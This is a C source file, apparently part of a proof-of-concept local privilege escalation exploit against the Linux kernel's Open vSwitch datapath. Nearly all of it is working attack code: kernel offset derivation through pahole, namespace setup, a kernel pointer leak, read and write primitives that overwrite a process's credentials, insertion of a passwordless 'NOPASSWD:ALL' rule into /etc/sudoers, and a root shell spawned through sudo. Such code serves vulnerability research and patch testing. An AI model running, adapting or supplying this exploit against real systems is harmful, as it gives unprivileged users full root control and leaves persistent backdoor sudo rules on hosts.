    snprintf(p, sizeof(p), "/usr/lib/debug/boot/vmlinux-%s", u.release);
    btf_add_path(&paths, &cnt, &cap, p);
    snprintf(p, sizeof(p), "/usr/lib/debug/lib/modules/%s/vmlinux", u.release);
    btf_add_path(&paths, &cnt, &cap, p);
    snprintf(p, sizeof(p), "/usr/lib/debug/vmlinux-%s", u.release);
    btf_add_path(&paths, &cnt, &cap, p);

    DIR *src = opendir("/usr/src");
    if (src) {
        struct dirent *de;
        while ((de = readdir(src)) != NULL) {
            if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                continue;
            char q[600];
            snprintf(q, sizeof(q), "/usr/src/%s/vmlinux", de->d_name);
            btf_add_path(&paths, &cnt, &cap, q);
        }
        closedir(src);
    }

    btf_readable = NULL;
    btf_readable_count = 0;
    int cap2 = 0;
    for (int i = 0; i < cnt; i++) {
        struct stat st;
        if (stat(paths[i], &st) == 0 && S_ISREG(st.st_mode) &&
            access(paths[i], R_OK) == 0)
            btf_add_path(&btf_readable, &btf_readable_count, &cap2, paths[i]);
        free(paths[i]);
    }
    free(paths);
    if (btf_readable_count == 0) {
        fprintf(stderr, "kernel is not covered by pre-derived records, and "
                        "this user could not find readable local BTF or "
                        "unstripped kernel build objects for pahole-based "
                        "layout derivation.\n");
        exit(1);
    }
    printf("debug info: found %d readable pahole source files\n",
           btf_readable_count);
}

typedef struct {
    char name[64];
    char *output;
} btf_cache_ent;
static btf_cache_ent btf_cache[64];
static int btf_cache_count = 0;

static char *btf_struct_text(const char *type)
{
    for (int i = 0; i < btf_cache_count; i++)
        if (strcmp(btf_cache[i].name, type) == 0)
            return btf_cache[i].output;

    char needle[80];
    snprintf(needle, sizeof(needle), "struct %s", type);

    for (int i = 0; i < btf_readable_count; i++) {
        const char *p = btf_readable[i];
        bool in_btf_dir = (strncmp(p, "/sys/kernel/btf/", 15) == 0);
        char cmds[2][1024];
        int ncmds = 0;
        if (!in_btf_dir) {
            snprintf(cmds[0], sizeof(cmds[0]), "pahole -F dwarf -C %s %s 2>&1",
                     type, p);
            ncmds = 1;
        } else if (strcmp(p, "/sys/kernel/btf/vmlinux") == 0) {
            snprintf(cmds[0], sizeof(cmds[0]), "pahole -C %s %s 2>&1", type, p);
            ncmds = 1;
        } else {
            snprintf(cmds[0], sizeof(cmds[0]), "pahole -C %s %s 2>&1", type, p);
            ncmds = 1;
            if (access("/sys/kernel/btf/vmlinux", R_OK) == 0) {
                snprintf(cmds[1], sizeof(cmds[1]),
                         "pahole --btf_base=/sys/kernel/btf/vmlinux -C %s %s "
                         "2>&1", type, p);
                ncmds = 2;
            }
        }
        for (int c = 0; c < ncmds; c++) {
            char *out = run_capture(cmds[c]);
            if (out && strstr(out, needle)) {
                printf("debug info: found struct %s in %s\n", type, p);
                if (btf_cache_count < 64) {
                    snprintf(btf_cache[btf_cache_count].name, 64, "%s", type);
                    btf_cache[btf_cache_count].output = out;
                    btf_cache_count++;
                }
                return out;
            }
            if (out)
                free(out);
        }
    }
    fprintf(stderr, "required debug type struct %s was not found in readable "
                    "local BTF or unstripped kernel build objects\n", type);
    exit(1);
}

static bool line_has_field(const char *line, const char *field)
{
    const char *p = line;
    size_t fl = strlen(field);
    while ((p = strstr(p, field)) != NULL) {
        char pre = (p > line) ? p[-1] : ' ';
        if (p == line || pre == ' ' || pre == '\t' || pre == '*' || pre == ')') {
            const char *q = p + fl;
            while (*q == ' ' || *q == '\t')
                q++;
            if (*q == '[' || *q == ';' || *q == ')' ||
                strncmp(q, "__attribute__", 13) == 0)
                return true;
        }
        p += fl;
    }
    return false;
}

static long extract_offset_comment(const char *line)
{
    const char *c = strstr(line, "/*");
    if (!c)
        return -1;
    c += 2;
    while (*c == ' ' || *c == '\t')
        c++;
    if (!isdigit((unsigned char)*c))
        return -1;
    long a = strtol(c, (char **)&c, 10);
    if (*c != ' ' && *c != '\t')
        return -1;
    while (*c == ' ' || *c == '\t')
        c++;
    if (!isdigit((unsigned char)*c))
        return -1;
    strtol(c, (char **)&c, 10);
    while (*c == ' ' || *c == '\t')
        c++;
    if (*c != '*' || c[1] != '/')
        return -1;
    return a;
}

static long parse_pahole_field_offset(const char *text, const char *field)
{
    const char *p = text;
    while (p && *p) {
        const char *nl = strchr(p, '\n');
        size_t linelen = nl ? (size_t)(nl - p) : strlen(p);
        char *line = strndup(p, linelen);
        if (line) {
            if (strstr(line, "/*") && line_has_field(line, field)) {
                long v = extract_offset_comment(line);
                free(line);
                if (v >= 0)
                    return v;
            }
            free(line);
        }
        p = nl ? nl + 1 : p + linelen;
    }
    return -1;
}

static long parse_pahole_size(const char *text)
{
    const char *c = strstr(text, "size:");
    while (c) {
        const char *b = c;
        while (b > text && (b[-1] == ' ' || b[-1] == '\t'))
            b--;
        if (b > text && b[-1] == '*' && b - 1 > text && b[-2] == '/') {
            c += 5;
            while (*c == ' ' || *c == '\t')
                c++;
            if (isdigit((unsigned char)*c))
                return strtol(c, NULL, 10);
        }
        c = strstr(c + 1, "size:");
    }
    return -1;
}

static long btf_field_offset_opt(const char *type, const char *field)
{
    char *text = btf_struct_text(type);
    return parse_pahole_field_offset(text, field);
}

static long btf_field_offset(const char *type, const char *field)
{
    char *text = btf_struct_text(type);
    long v = parse_pahole_field_offset(text, field);
    if (v < 0) {
        fprintf(stderr, "could not parse %s.%s offset from pahole output\n",
                type, field);
        exit(1);
    }
    return v;
}

static long btf_struct_size(const char *type)
{
    char *text = btf_struct_text(type);
    long v = parse_pahole_size(text);
    if (v < 0) {
        fprintf(stderr, "could not parse sizeof(struct %s)\n", type);
        exit(1);
    }
    return v;
}

static struct offsets derive_kernel_offsets(long symbol_module_ktype,
                                            long symbol_init_pid_ns)
{
    struct offsets o;
    memset(&o, 0, sizeof(o));

    long module_mkobj = btf_field_offset("module", "mkobj");
    long module_kobject_kobj = btf_field_offset("module_kobject", "kobj");
    long kobject_ktype = btf_field_offset("kobject", "ktype");
    long ovs_conntrack_info_size = btf_struct_size("ovs_conntrack_info");
    long ovs_ct_labels = btf_field_offset("ovs_conntrack_info", "labels");
    long ip_tunnel_info_key = btf_field_offset("ip_tunnel_info", "key");

    long dst_entry_ref = btf_field_offset_opt("dst_entry", "__rcuref");
    o.dst_entry_ref_kind = "__rcuref";
    if (dst_entry_ref < 0) {
        dst_entry_ref = btf_field_offset("dst_entry", "__refcnt");
        o.dst_entry_ref_kind = "__refcnt";
    }
    o.nf_conntrack_helper_me = btf_field_offset("nf_conntrack_helper", "me");
    o.module_kobj_ktype = module_mkobj + module_kobject_kobj + kobject_ktype;
    o.vmlinux_module_ktype = symbol_module_ktype;
    o.vmlinux_init_pid_ns = symbol_init_pid_ns;
    o.task_pid = btf_field_offset("task_struct", "pid");
    o.task_cred = btf_field_offset("task_struct", "cred");
    o.task_pid_links = btf_field_offset("task_struct", "pid_links");
    o.cred_fsuid = btf_field_offset("cred", "fsuid");
    o.cred_fsgid = btf_field_offset("cred", "fsgid");
    o.cred_cap_permitted = btf_field_offset("cred", "cap_permitted");
    o.cred_cap_effective = btf_field_offset("cred", "cap_effective");
    o.pid_namespace_idr = btf_field_offset("pid_namespace", "idr");
    o.idr_idr_rt = btf_field_offset("idr", "idr_rt");
    o.idr_base = btf_field_offset("idr", "idr_base");
    o.xarray_xa_head = btf_field_offset("xarray", "xa_head");
    o.xa_node_shift = btf_field_offset("xa_node", "shift");
    o.xa_node_slots = btf_field_offset("xa_node", "slots");
    o.pid_tasks = btf_field_offset("pid", "tasks");
    o.hlist_head_first = btf_field_offset("hlist_head", "first");
    o.dst_entry_ref = dst_entry_ref;
    o.metadata_dst_tun_info = btf_field_offset("metadata_dst", "u");
    o.ip_tunnel_key_ipv4_src =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "src");
    o.ip_tunnel_key_ipv4_dst =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "dst");
    o.ip_tunnel_key_tos =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "tos");
    o.ip_tunnel_key_ttl =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "ttl");
    o.ip_tunnel_key_tp_src =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "tp_src");
    o.ip_tunnel_key_tp_dst =
        ip_tunnel_info_key + btf_field_offset("ip_tunnel_key", "tp_dst");
    o.ovs_ct_labels = ovs_ct_labels;
    o.ovs_ct_action_len = NLA_HEADER_SIZE + ovs_conntrack_info_size;

    printf("kernel offsets: derived from local symbols and debug type info\n");
    return o;
}

static void current_kernel_parameters(struct kernel_build_record **rec_out,
                                      struct offsets *offsets_out)
{
    load_records();
    struct kernel_build_record *record = lookup_kernel_build_record();
    if (record) {
        printf("kernel offsets: using pre-derived values\n");
        derive_ovs_uapi_constants_record(record);
        *rec_out = record;
        *offsets_out = record->offsets;
        return;
    }
    printf("This kernel is not covered by the embedded pre-derived record "
           "table; attempting dynamic derivation from local System.map/"
           "kallsyms and BTF (pahole required). This does NOT mean you are "
           "unaffected if derivation fails.\n");
    fflush(stdout);
    if (!binary_in_path("pahole")) {
        fprintf(stderr, "kernel is not covered by pre-derived records, and "
                        "pahole is required to dynamically derive kernel "
                        "struct offsets from local debug info. This does NOT "
                        "mean you are not affected.\n");
        exit(1);
    }
    long mko, ipns;
    derive_symbol_offsets(&mko, &ipns);
    btf_init();
    *offsets_out = derive_kernel_offsets(mko, ipns);
    derive_ovs_uapi_constants_dynamic();
    *rec_out = NULL;
}

/* ---------------------------------------------------------- host helpers */
static uint64_t effective_capability_mask(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (!f)
        return 0;
    char line[1024];
    uint64_t mask = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "CapEff:", 7) == 0) {
            char *p = line + 7;
            while (*p == ' ' || *p == '\t')
                p++;
            mask = strtoull(p, NULL, 16);
            break;
        }
    }
    fclose(f);
    return mask;
}

static void launching_user(uid_t *uid, gid_t *gid, char *name, size_t namesz)
{
    step("CHECKING LAUNCHING USER");
    *uid = getuid();
    *gid = getgid();
    if (*uid == 0 || geteuid() == 0) {
        fprintf(stderr, "refusing to run as root. Run this PoC directly as "
                        "an ordinary non-sudo local user.\n");
        exit(1);
    }
    if (effective_capability_mask() != 0) {
        fprintf(stderr, "refusing to run with preexisting effective "
                        "capabilities. Run this PoC as an ordinary "
                        "unprivileged user.\n");
        exit(1);
    }
    struct passwd *pw = getpwuid(*uid);
    if (!pw) {
        fprintf(stderr, "uid %d has no passwd entry\n", *uid);
        exit(1);
    }
    snprintf(name, namesz, "%s", pw->pw_name);
    printf("launching user: name=%s uid=%d gid=%d\n", name, *uid, *gid);
    fflush(stdout);
}

static void ensure_no_passwordless_sudo(const char *username)
{
    step("CHECKING BASELINE SUDO ACCESS");
    FILE *probe = popen("sudo -n true 2>&1", "r");
    if (!probe) {
        fprintf(stderr, "could not run sudo\n");
        exit(1);
    }
    size_t cap = 4096, len = 0;
    char *all = malloc(cap);
    if (!all) {
        fprintf(stderr, "out of memory\n");
        exit(1);
    }
    char tmp[256];
    size_t n;
    while ((n = fread(tmp, 1, sizeof(tmp), probe)) > 0) {
        if (len + n + 1 >= cap) {
            cap *= 2;
            all = realloc(all, cap);
            if (!all) {
                fprintf(stderr, "out of memory\n");
                exit(1);
            }
        }
        memcpy(all + len, tmp, n);
        len += n;
    }
    all[len] = 0;
    int st = pclose(probe);
    int rc = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
    if (rc == 0) {
        fprintf(stderr, "refusing to run: user %s already has passwordless "
                        "sudo. Use a non-sudo ordinary user so the root-shell "
                        "delta is meaningful.\n", username);
        free(all);
        exit(1);
    }
    printf("baseline passwordless sudo for %s: denied\n", username);
    if (len) {
        char *nl = strchr(all, '\n');
        if (nl)
            *nl = 0;
        printf("sudo denial detail: %s\n", all);
    }
    free(all);
}

static bool try_write_root_proof(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        printf("write %s failed: errno=%d %s\n", path, errno, strerror(errno));
        fflush(stdout);
        return false;
    }
    size_t n = strlen(text);
    bool ok = true;
    while (n) {
        ssize_t w = write(fd, text, n);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            ok = false;
            break;
        }
        text += w;
        n -= (size_t)w;
    }
    close(fd);
    sync();
    return ok;
}

/* ----------------------------------------------------------- sudoers */
static bool sudoers_references_dropin_dir(void)
{
    FILE *f = fopen(SUDOERS_FILE, "r");
    if (!f) {
        printf("could not inspect %s: errno=%d %s\n", SUDOERS_FILE, errno,
               strerror(errno));
        return false;
    }
    char line[1024];
    bool res = false;
    while (fgets(line, sizeof(line), f)) {
        char *s = line;
        while (*s == ' ' || *s == '\t')
            s++;
        if (strncmp(s, "#includedir", 11) == 0 ||
            strncmp(s, "@includedir", 11) == 0) {
            char *p = s + 11;
            while (*p == ' ' || *p == '\t')
                p++;
            char *e = p;
            while (*e && *e != '\n' && *e != ' ' && *e != '\t')
                e++;
            char dir[256];
            size_t dl = (size_t)(e - p);
            if (dl >= sizeof(dir))
                dl = sizeof(dir) - 1;
            memcpy(dir, p, dl);
            dir[dl] = 0;
            size_t l = strlen(dir);
            if (l >= 2 && (dir[0] == '"' || dir[0] == '\'') &&
                dir[l - 1] == dir[0]) {
                memmove(dir, dir + 1, l - 2);
                dir[l - 2] = 0;
            }
            if (strcmp(dir, SUDOERS_DROPIN_DIR) == 0) {
                res = true;
                break;
            }
        }
    }
    fclose(f);
    return res;
}

static bool write_sudoers_dropin(const char *path, const char *username)
{
    char content[512];
    int clen = snprintf(content, sizeof(content),
                        "%s ALL=(ALL) NOPASSWD:ALL\n", username);
    mode_t old = umask(0);
    char dir[512];
    strcpy(dir, path);
    char *sl = strrchr(dir, '/');
    if (sl)
        *sl = 0;
    if (mkdir(dir, 0755) < 0 && errno != EEXIST) {
        printf("sudoers drop-in write %s failed: mkdir: %s\n", path,
               strerror(errno));
        umask(old);
        return false;
    }
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) {
        printf("sudoers drop-in write %s failed: errno=%d %s\n", path, errno,
               strerror(errno));
        umask(old);
        return false;
    }
    int n = clen;
    const char *cp = content;
    while (n > 0) {
        ssize_t w = write(fd, cp, (size_t)n);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        cp += w;
        n -= (int)w;
    }
    fchmod(fd, 0440);
    fsync(fd);
    close(fd);
    sync();
    umask(old);
    return n == 0;
}

static bool append_main_sudoers(const char *username)
{
    char content[512];
    int clen = snprintf(content, sizeof(content),
                        "\n%s ALL=(ALL:ALL) NOPASSWD:ALL\n", username);
    int fd = open(SUDOERS_FILE, O_WRONLY | O_APPEND);
    if (fd < 0) {
        printf("sudoers append %s failed: errno=%d %s\n", SUDOERS_FILE, errno,
               strerror(errno));
        return false;
    }
    int n = clen;
    const char *cp = content;
    while (n > 0) {
        ssize_t w = write(fd, cp, (size_t)n);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        cp += w;
        n -= (int)w;
    }
    fsync(fd);
    close(fd);
    sync();
    return n == 0;
}

static bool replace_main_sudoers(const char *username)
{
    int rfd = open(SUDOERS_FILE, O_RDONLY);
    if (rfd < 0) {
        printf("sudoers replace %s failed: open: %s\n", SUDOERS_FILE,
               strerror(errno));
        return false;
    }
    size_t cap = 8192, len = 0;
    char *existing = malloc(cap);
    if (!existing) {
        close(rfd);
        return false;
    }
    ssize_t n;
    while ((n = read(rfd, existing + len, cap - len - 1)) > 0) {
        len += (size_t)n;
        if (len + 1 >= cap) {
            cap *= 2;
            existing = realloc(existing, cap);
            if (!existing) {
                close(rfd);
                return false;
            }
        }
    }
    close(rfd);
    existing[len] = 0;

    char tmpl[512];
    snprintf(tmpl, sizeof(tmpl), "/etc/.ovs_c004_sudoers_%d", getpid());
    unlink(tmpl);
    int fd = open(tmpl, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (fd < 0) {
        printf("sudoers replace %s failed: tmp open: %s\n", SUDOERS_FILE,
               strerror(errno));
        free(existing);
        return false;
    }
    size_t towrite = len;
    const char *wp = existing;
    while (towrite) {
        ssize_t w = write(fd, wp, towrite);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        wp += w;
        towrite -= (size_t)w;
    }
    char append[512];
    int alen = snprintf(append, sizeof(append),
                        "\n%s ALL=(ALL:ALL) NOPASSWD:ALL\n", username);
    const char *ap = append;
    while (alen) {
        ssize_t w = write(fd, ap, (size_t)alen);
        if (w < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        ap += w;
        alen -= (int)w;
    }
    free(existing);
    fchmod(fd, 0440);
    fsync(fd);
    close(fd);
    if (rename(tmpl, SUDOERS_FILE) < 0) {
        printf("sudoers replace %s failed: rename: %s\n", SUDOERS_FILE,
               strerror(errno));
        unlink(tmpl);
        return false;
    }
    int dfd = open("/etc", O_RDONLY);
    if (dfd >= 0) {
        fsync(dfd);
        close(dfd);
    }
    sync();
    return true;
}

static bool write_sudoers_entry(const char *path, const char *username,
                                char *used, size_t usedsz)
{
    if (sudoers_references_dropin_dir()) {
        if (write_sudoers_dropin(path, username)) {
            snprintf(used, usedsz, "%s", path);
            return true;
        }
        printf("falling back to direct append of %s\n", SUDOERS_FILE);
    } else {
        printf("%s does not reference %s; using direct sudoers append\n",
               SUDOERS_FILE, SUDOERS_DROPIN_DIR);
    }
    if (append_main_sudoers(username)) {
        snprintf(used, usedsz, "%s", SUDOERS_FILE);
        return true;
    }
    printf("falling back to atomic replacement of %s\n", SUDOERS_FILE);
    if (replace_main_sudoers(username)) {
        snprintf(used, usedsz, "%s", SUDOERS_FILE);
        return true;
    }
    return false;
}

static void try_become_root_ids(void)
{
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
}

static void sleep_forever_detached(void)
{
    setsid();
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, 0);
        dup2(devnull, 1);
        dup2(devnull, 2);
        if (devnull > 2)
            close(devnull);
    }
    for (;;)
        sleep(3600);
}

/* ------------------------------------------------- writer + pin children */
static int writer_trigger_fd = -1;
static int writer_ack_fd = -1;
static pid_t writer_pid = -1;

static void fork_sudoers_writer(const char *path, const char *username)
{
    int trig[2], ack[2];
    if (pipe(trig) < 0 || pipe(ack) < 0) {
        fprintf(stderr, "pipe failed: %s\n", strerror(errno));
        exit(1);
    }
    pid_t child = fork();
    if (child < 0) {
        fprintf(stderr, "fork failed: %s\n", strerror(errno));
        exit(1);
    }
    if (child == 0) {
        close(trig[1]);
        close(ack[0]);
        char tok;
        ssize_t n = read(trig[0], &tok, 1);
        bool ok = false;
        char used[512] = { 0 };
        if (n == 1 && tok == '1') {
            try_become_root_ids();
            ok = write_sudoers_entry(path, username, used, sizeof(used));
        }
        char resp[1024];
        int rlen;
        if (ok)
            rlen = snprintf(resp, sizeof(resp), "1 %s\n", used);
        else {
            resp[0] = '0';
            resp[1] = '\n';
            rlen = 2;
        }
        ssize_t wn = 0;
        while (wn < rlen) {
            ssize_t w = write(ack[1], resp + wn, (size_t)(rlen - wn));
            if (w < 0) {
                if (errno == EINTR)
                    continue;
                break;
            }
            wn += w;
        }
        close(trig[0]);
        close(ack[1]);
        if (ok)
            sleep_forever_detached();
        _exit(0);
    }
    close(trig[0]);
    close(ack[1]);
    writer_trigger_fd = trig[1];
    writer_ack_fd = ack[0];
    writer_pid = child;
    printf("host sudoers writer child pid=%d\n", child);
    fflush(stdout);
}

static void fork_namespace_pin(void)
{
    pid_t c = fork();
    if (c == 0)
        sleep_forever_detached();
    printf("namespace pin child pid=%d\n", c);
    fflush(stdout);
}

static void trigger_sudoers_writer(char *used, size_t usedsz)
{
    write(writer_trigger_fd, "1", 1);
    char buf[4096];
    size_t total = 0;
    ssize_t n;
    while ((n = read(writer_ack_fd, buf + total, sizeof(buf) - total - 1)) > 0) {
        total += (size_t)n;
        if (total >= sizeof(buf) - 2)
            break;
    }
    buf[total] = 0;
    close(writer_trigger_fd);
    close(writer_ack_fd);
    writer_trigger_fd = writer_ack_fd = -1;
    if (total < 2 || buf[0] != '1' || buf[1] != ' ') {
        fprintf(stderr, "sudoers writer child failed\n");
        exit(1);
    }
    size_t l = strlen(buf + 2);
    if (l && buf[2 + l - 1] == '\n')
        buf[2 + l - 1] = 0;
    strncpy(used, buf + 2, usedsz - 1);
    used[usedsz - 1] = 0;
}

/* ------------------------------------------------------------- namespace */
static void write_uid_gid_maps(uid_t uid, gid_t gid)
{
    int fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) {
        write(fd, "deny\n", 5);
        close(fd);
    }
    char buf[128];
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) {
        fprintf(stderr, "open uid_map failed: %s\n", strerror(errno));
        exit(1);
    }
    snprintf(buf, sizeof(buf), "0 %d 1\n", (int)uid);
    if (write(fd, buf, strlen(buf)) < 0) {
        fprintf(stderr, "write uid_map failed: %s\n", strerror(errno));
        exit(1);
    }
    close(fd);
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd < 0) {
        fprintf(stderr, "open gid_map failed: %s\n", strerror(errno));
        exit(1);
    }
    snprintf(buf, sizeof(buf), "0 %d 1\n", (int)gid);
    if (write(fd, buf, strlen(buf)) < 0) {
        fprintf(stderr, "write gid_map failed: %s\n", strerror(errno));
        exit(1);
    }
    close(fd);
}

static void enter_private_namespace(void)
{
    step("ENTERING PRIVATE USER AND NETWORK NAMESPACES");
    uid_t orig_uid = getuid();
    gid_t orig_gid = getgid();
    if (unshare(CLONE_NEWUSER) < 0) {
        fprintf(stderr, "unshare(CLONE_NEWUSER) failed: %s. Note: the C port "
                        "does not implement the aa-exec trinity fallback; "
                        "allow unprivileged user namespaces or run under an "
                        "AppArmor trinity profile.\n", strerror(errno));
        exit(1);
    }
    write_uid_gid_maps(orig_uid, orig_gid);
    if (unshare(CLONE_NEWNET) < 0) {
        fprintf(stderr, "unshare(CLONE_NEWNET) failed: %s\n", strerror(errno));
        exit(1);
    }
    if (getuid() != 0 || geteuid() != 0) {
        fprintf(stderr, "child is not uid 0 inside the private user "
                        "namespace\n");
        exit(1);
    }
}

/* ------------------------------------------------------------- exploit */
static void print_uid_map(void)
{
    FILE *f = fopen("/proc/self/uid_map", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f))
            printf("uid_map: %s", line);
        fclose(f);
    }
}

static void print_process_id(void)
{
    char *out = run_capture("id 2>&1");
    if (out) {
        printf("process identity: %s", out);
        free(out);
    }
}

static void print_cap_eff(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "CapEff:", 7) == 0) {
                printf("effective capability mask: %s", line);
                break;
            }
        }
        fclose(f);
    }
}

static void exploit_from_private_namespace(const char *host_user)
{
    step("BEGINNING SETUP");
    printf("host user for sudoers entry: %s\n", host_user);
    printf("namespace uid/gid: uid=%d gid=%d\n", getuid(), getgid());
    print_process_id();
    print_cap_eff();
    print_uid_map();
    fflush(stdout);

    genl_open();
    int dp_family = genl_get_family("ovs_datapath");
    int flow_family = genl_get_family("ovs_flow");
    char dp_name[32];
    snprintf(dp_name, sizeof(dp_name), "vhrd%d", getpid() % 10000);
    ovs_create_datapath(dp_family, dp_name);
    int dp_ifindex = if_nametoindex(dp_name);
    if (dp_ifindex == 0) {
        fprintf(stderr, "datapath %s created but if_nametoindex failed: "
                        "%s\n", dp_name, strerror(errno));
        exit(1);
    }
    printf("datapath %s ifindex %d\n", dp_name, dp_ifindex);
    fflush(stdout);

    step("DERIVING KERNEL OFFSETS");
    struct kernel_build_record *kernel_record = NULL;
    struct offsets offsets;
    current_kernel_parameters(&kernel_record, &offsets);

    fork_namespace_pin();

    step("BUILDING OVS ACTION PRIMITIVES");
    size_t lklen;
    uint8_t *leakkey = flow_key(1, &lklen);
    size_t ll_alen;
    uint8_t *leakactions = clone_with_helper_leak(&ll_alen);
    if (ovs_create_flow(flow_family, dp_ifindex, leakkey, lklen, leakactions,
                        ll_alen) < 0) {
        fprintf(stderr, "failed to create helper leak flow\n");
        exit(1);
    }
    free(leakactions);
    uint8_t *leakdump = NULL;
    size_t leakdumplen = 0;
    if (ovs_get_flow_actions(flow_family, dp_ifindex, leakkey, lklen,
                             &leakdump, &leakdumplen) < 0) {
        fprintf(stderr, "failed to get helper leak actions\n");
        exit(1);
    }
    uint64_t helper_pointer = find_helper_pointer(leakdump, leakdumplen);
    free(leakdump);
    free(leakkey);
    printf("leaked helper-ish pointer 0x%016llx\n",
           (unsigned long long)helper_pointer);
    fflush(stdout);

    int read_carrier = kernel_record
                           ? carrier_str_to_mode(kernel_record->read_carrier)
                           : CARRIER_AUTO;
    int write_carrier = kernel_record
                            ? carrier_str_to_mode(kernel_record->write_carrier)
                            : CARRIER_AUTO;
    const char *const *pref = kernel_record ? kernel_record->read_lanes : NULL;
    int npref = kernel_record ? kernel_record->read_lanes_count : 0;

    reader_t reader;
    reader_init(&reader, &offsets, flow_family, dp_ifindex, read_carrier, pref,
                npref);
    writer_t writer;
    writer_init(&writer, &offsets, flow_family, dp_ifindex, write_carrier);

    int64_t module_ktype = derive_helper_module_ktype(
        &reader, helper_pointer + (uint64_t)offsets.nf_conntrack_helper_me,
        helper_pointer, &offsets);
    uint64_t kernel_base =
        (uint64_t)module_ktype - (uint64_t)offsets.vmlinux_module_ktype;
    printf("module_ktype=0x%016lx kernel_base=0x%016llx\n",
           (unsigned long)module_ktype, (unsigned long long)kernel_base);
    fflush(stdout);

    step("CHECKING BASELINE WRITE");
    char proof[128];
    snprintf(proof, sizeof(proof), "/root/ovs_c004_lpe_proof_%d", getpid());
    if (try_write_root_proof(proof, "pre-exploit should not write\n")) {
        fprintf(stderr, "unexpectedly wrote root proof path before exploit\n");
        exit(1);
    }

    step("LOCATING WRITER CREDENTIAL");
    uint64_t task = locate_task_by_init_pid_ns(&reader, &offsets, kernel_base,
                                               writer_pid);
    uint64_t cred = read_kernel_pointer(&reader,
                                        task + (uint64_t)offsets.task_cred,
                                        "task->cred");
    printf("writer task=0x%016llx pid=%d cred=0x%016llx\n",
           (unsigned long long)task, writer_pid, (unsigned long long)cred);
    fflush(stdout);

    convert_writer_credential(&reader, &writer, &offsets, cred);

    step("WRITING SUDOERS ENTRY");
    char used[512];
    trigger_sudoers_writer(used, sizeof(used));
    printf("sudoers write succeeded: %s user=%s\n", used, host_user);
    printf("sudoers policy write achieved; returning to launcher for root "
           "shell\n");
    fflush(stdout);
}

/* --------------------------------------------------------------- root shell */
static void spawn_root_shell(const char *username)
{
    step("SPAWNING ROOT SHELL");
    printf("RESULT: sudoers policy write achieved; spawning 'sudo -n bash' as "
           "%s\n", username);
    fflush(stdout);
    execlp("sudo", "sudo", "-n", "bash", (char *)NULL);
    fprintf(stderr, "failed to spawn root shell through sudo: %s\n",
            strerror(errno));
    exit(1);
}

int main(void)
{
    uid_t host_uid;
    gid_t host_gid;
    char host_user[256];

    launching_user(&host_uid, &host_gid, host_user, sizeof(host_user));
    ensure_no_passwordless_sudo(host_user);

    char sudoers_path[256];
    snprintf(sudoers_path, sizeof(sudoers_path), "/etc/sudoers.d/ovs_c004_%d",
             getpid());
    fork_sudoers_writer(sudoers_path, host_user);

    pid_t child = fork();
    if (child < 0) {
        fprintf(stderr, "fork failed: %s\n", strerror(errno));
        exit(1);
    }
    if (child == 0) {
        enter_private_namespace();
        exploit_from_private_namespace(host_user);
        _exit(0);
    }

    int status;
    if (waitpid(child, &status, 0) < 0) {
        fprintf(stderr, "waitpid failed: %s\n", strerror(errno));
        exit(1);
    }
    if (writer_trigger_fd >= 0) {
        close(writer_trigger_fd);
        close(writer_ack_fd);
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        fprintf(stderr, "namespace child failed with exit status %d\n",
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        exit(1);
    }

    spawn_root_shell(host_user);
    return 0;
}
